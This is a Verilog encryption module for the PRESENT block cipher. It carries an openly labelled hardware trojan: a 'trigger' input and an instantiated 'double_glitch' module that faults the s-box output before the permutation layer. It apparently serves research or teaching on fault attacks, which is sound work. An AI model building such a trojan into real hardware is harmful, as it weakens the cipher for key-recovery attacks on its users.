//======================================================================
//
// Design Name:    PRESENT Block Cipher
// Module Name:    PRESENT_ENCRYPT
//
// Description:    PRESENT Encryption Module (top level)
//
// Dependencies:
//              present_encrypt_sbox.v
//              present_encrypt_pbox.v
//
// Language: Verilog 2001
// Author: Saied H. Khayat
// Date:   March 2011
// URL: https://github.com/saiedhk
//
// Copyright Notice: Free use of this library is permitted under the
// guidelines and in accordance with the MIT License (MIT).
// http://opensource.org/licenses/MIT
//
//======================================================================
`default_nettype none

module present_encrypt (
        input wire          clk,     // clock
        input wire          rst_n,   // reset 
        input wire [63:0]   idat,    // data input port
        input wire [79:0]   key,     // key input port
        input wire          load,    // data load command
        input wire [1:0]    trigger, // HW-trojan trigger
        output wire [63:0]  odat,     // data output port; should be register???
        output wire         odat_valid
    );

//---------wires, registers----------
reg  [79:0] kreg;               // key register
reg  [63:0] dreg;               // data register
reg  [4:0]  round;              // round counter, up to 32
reg loaded;                     // data loaded register
wire [63:0] dat1,dat2,dat3;     // intermediate data
wire [79:0] kdat1,kdat2;        // intermediate subkey data
wire [63:0] dat2_faulted;       // faulted dat2 signal


//---------combinational processes----------

assign dat1 = dreg ^ kreg[79:16];        // add round key
assign odat = dat1;                      // output ciphertext
assign odat_valid = (round == 0 && rst_n && loaded) ? 1 : 0;    // sets odat_valid if we are not in reset and rounds have looped to zero; high for one clock cycle only

// key update
assign kdat1        = {kreg[18:0], kreg[79:19]}; // rotate key 61 bits to the left
assign kdat2[14:0 ] = kdat1[14:0 ];
assign kdat2[19:15] = kdat1[19:15] ^ round;  // xor key data and round counter
assign kdat2[75:20] = kdat1[75:20];


//---------instantiations--------------------

// instantiate 16 substitution boxes (s-box) for encryption
genvar i;
generate
    for (i=0; i<64; i=i+4) begin: sbox_loop
       present_encrypt_sbox usbox( .odat(dat2[i+3:i]), .idat(odat[i+3:i]) );
    end
endgenerate

// instantiate double-glitch trojan
double_glitch glitcher (.round(round), .trigger(trigger), .data_in(dat2), .data_out(dat2_faulted));

// instantiate pbox (p-layer)
present_encrypt_pbox upbox    ( .odat(dat3), .idat(dat2_faulted) ); //input is the faulted dat2

// instantiate substitution box (s-box) for key expansion
present_encrypt_sbox usboxkey ( .odat(kdat2[79:76]), .idat(kdat1[79:76]) );


//---------sequential processes----------
// TODO: restructure as state machine

always @(posedge clk or negedge rst_n) begin
   if (!rst_n) begin
      // reset all internal registers 
      kreg <= 0;
      dreg <= 0;
      round <= 0;
      loaded <= 0;
   end else if (load) begin
      dreg <= idat;        // load data
      kreg <= key;         // load key
      round <= 1;          // set round counter to 1
      loaded <= 1;         // set loaded to 1 when loading data
   end else begin
      dreg <= dat3;        // update data register
      kreg <= kdat2;       // update key register
      round <= round + 1;  // update round counter
      if (round == 0) loaded <= 0; // reset loaded when looping around
   end
end


endmodule